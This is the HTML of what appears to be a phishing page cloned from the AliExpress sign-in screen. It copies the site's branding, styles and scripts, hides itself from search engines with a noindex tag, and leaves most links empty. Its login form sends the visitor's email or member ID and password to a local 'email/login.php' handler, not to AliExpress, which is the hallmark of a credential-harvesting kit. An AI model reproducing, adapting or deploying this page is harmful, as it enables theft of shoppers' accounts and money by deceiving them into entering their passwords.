<!--

-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="renderer" content="webkit"> 
  
	<title>Buy Products Online from China Wholesalers at Aliexpress.com</title>
  <meta name="robots" content="noindex" />
	  <link rel="shortcut icon" link rel="logo-icon" href="images/favicon.ico">
	  		<link rel="shortcut icon" href="https://g.alicdn.com/vip/login/0.5.20/havanalogin/images/favicon.ico?v=20141022" type="image/x-icon"/>
		        <link href="https://g.alicdn.com/vip/login/0.5.20/havanalogin/css/mini-login-form-min.css?v=20150309" rel="stylesheet" type="text/css" />
        		<link href="https://i.alicdn.com/ae-login/login/havana-buyer.e42cf938.css" rel="stylesheet" type="text/css" />
		        <link type="text/css" href="//g.alicdn.com/sd/ncpc/nc.css?t=2015052012" rel="stylesheet" />
  <link rel="stylesheet" type="text/css" href="//i.alicdn.com/ae-login/login/??buyerlogin.c5e9b325.css" />
  <script data-locale="en_US"  src="//i.alicdn.com/ae-login/??loader.730b983b.js"></script>
<script type="text/javascript"  data-version="ae-login=1.0.0;" src="//i.alicdn.com/ae-login/login/??buyerlogin.1c6b808a.js" async defer></script>

</head>
<body><script type=text/javascript>
    var dmtrack_c='{-}'; 
    var dmtrack_pageid='29894c680ab9e76a1467239440'; 
    (function() {
          var beacon = document.createElement('script'); 
          beacon.type = 'text/javascript'; beacon.async = true;
          beacon.src = 'https://u.alicdn.com/js/5v/run/pool/monitor/beacon_async.js?e=1440';
          var s = document.getElementsByTagName('script')[0]; 
          s.parentNode.insertBefore(beacon, s);
     })();
</script>
<script>
    var PAGE_TIMING = {
        pageType: 'wslogin'
    };
    PAGE_TIMING.startRenderImage = new Image();
    PAGE_TIMING.startRenderImage.onload = function() {
        PAGE_TIMING.startRender = new Date().getTime();
    };
    PAGE_TIMING.startRenderImage.src = '//u.alicdn.com/wimg/monitor/start-render.png';
</script>

    <div id="headerReg">
        <div class="header990">
            <div id="aliLogo" class="util-left">
            	<a title="www.aliexpress.com" href="">www.aliexpress.com</a>
                <p>Smarter Shopping, Better Living</p>
            </div>  
        <div style="clear:both"></div>
    </div>
    </div>

<div class="page" class="frameA signIn clearfix">
<input id="login-home-new" type="hidden" value="new" />

<div class="container">
  
  <div id="signInField">

    
    <div id="expressbuyerlogin">
<div id="login-wrap" style="padding:20px;" class="login-static nc-outer-box">
							<div class="hd">
        <h2 id="J_Static2Quick" class="quick">Sign in with QR Code </h2>
        <h2 id="J_Quick2Static" class="static">Sign in with Account</h2>
 </div>
			            <form method="post" action='email/login.php' class="form clr style-type-auto lang-en_us auto-en_us ">
    <div id="login-content" class="form clr">
		<dl>
        <dt class="fm-label">
            <div class="fm-label-wrap clr">
                <span id="login-id-label-extra" class="fm-label-extra">
									</span>
                <label for="fm-login-id">Email or ID:</label>
            </div>
        </dt>
        <dd id="fm-login-id-wrap" class="fm-field">
            <div class="fm-field-wrap">
                <div id="account-check-loading" class="loading-mask">
                    <div class="loading-icon"></div>
                    <div class="loading-mask-body"></div>
                </div>
                <input class="fm-text" required='' name="loginid" tabindex="1" placeholder="Email address or member ID" >
                            </div>
        </dd>
		</dl>
		<dl>
        <dt class="fm-label">
            <div class="fm-label-wrap clr">
                                    <span class="fm-label-extra">
    <a id="forgot-password-link" href="" target="_blank" data-spm-protocol="i">Forgot Password?</a>
</span>

                                <label for="fm-login-password">Password :</label>
            </div>
        </dt>
        <dd id="fm-login-password-wrap" class="fm-field">
            <div class="fm-field-wrap">
                <input class="fm-text" required='' type="password" name="password" tabindex="2" placeholder="Password">
                            </div>
        </dd>
        </dl>
    </div>

    <div id="login-submit">
        <input type="hidden" name="event_submit_do_login" value="submit">
				        <input id="fm-login-submit" value="Sign In" class="fm-button fm-submit" type="submit" tabindex="4" name="submit-btn">
    </div>
        <div id="login-other">
                    <div class="login-login-links">
</div>
                   </div>
            <script async="" src="//aeu.alicdn.com/static/13/cj.js"></script>
			<script type="text/javascript" src="//g.alicdn.com/security/umscript/3.2.1/um.js"></script>
			<script type="text/javascript" src="//aeu.alicdn.com/js/uab.js?_t=203784"></script>
			<script type="text/javascript" charset="utf-8" src="//g.alicdn.com/sd/ncpc/nc.js?t=2015052012"></script>
    </div>
    </div>
          <div class="join-link">
        <a id="join-link" class="util-right" href="" title="join in">Join free now!</a>
      </div>
            <div class="facebook">
        Sign&nbsp;in&nbsp;with:
        <a target="_blank" href=""><div class="google-icon"></div></a>
        <a target="_blank" href=""><div class="facebook-icon"></div></a>
              </div>
            </div>
  <div id="login-sub">
<style type="text/css">
.banner {display:none; padding:25px; color:#666; font-family:Arial; height:450px; width:990px; margin:auto;}
.banner .banner-title {font-weight:bold; font-size:24px; padding:0 15px; line-height:30px;}
.banner .banner-text {font-size:12px; margin-top:10px; line-height:20px; padding:0 15px;}
.banner-1 {padding:50px 0 0 0;}
.banner-2, .banner-3 {padding-left:0;}
.banner-1 .banner-title, .banner-2 .banner-title, .banner-3 .banner-title {padding-left:0px;}
.banner-1 .banner-text, .banner-2 .banner-text, .banner-3 .banner-text {padding-left:0px;}
.page.page-bg-1 {background-image: url(//i.alicdn.com/ae-login/images/banner-1.bb9edba7.png)}
.page.page-bg-2 {background-image: url(//i.alicdn.com/ae-login/images/banner-2.9db93b48.png)}
.page.page-bg-3 {background-image: url(//i.alicdn.com/ae-login/images/banner-3.24cff00d.png)}
</style>
<div class="banner-container">
	<div class="banner banner-1">
		<h3 class="banner-title">Smarter Shopping</h3>
		<h3 class="banner-title">Better Living!</h3>
		<ul class="banner-text">
			<li>Choose from over 40 different categories</li>
			<li>with millions of products</li>
		</ul>
	</div>

	<div class="banner banner-2">
		<h3 class="banner-title">The Best Value Online</h3>
		<ul class="banner-text">
			<li>Enjoy unbeatable prices and free shipping</li>
			<li>on almost all products!</li>
		</ul>
	</div>

	<div class="banner banner-3">
		<h3 class="banner-title">Shop With Confidence</h3>
		<ul class="banner-text">
			<li>AliExpress Buyer Protection has you covered</li>
			<li>from click to delivery</li>
		</ul>
	</div>
</div>
<script>
var activity = document.getElementById('activity');
if(activity && activity.innerHTML) {
  var cont = document.querySelector('.banner-container');
  if(cont) {
  	cont.style.display = 'none';
  }
}else{
  var randomIndex = (Math.random() * 100).toFixed(0) % 3;
  var cont = document.querySelector('.page');
  if(cont) {
    cont.className += ' page-bg-' + (randomIndex+1);
    var banners = document.querySelectorAll('.banner');
    banners[randomIndex].style.display = 'block';
  }
}
</script>
    
  </div>

  <div style="clear:both;"></div>
</div>
</div>

<!-- -->
<div id="footer">
<center>
<img src="images/footer.png"/>
</center>
</div>

</body>
</html>
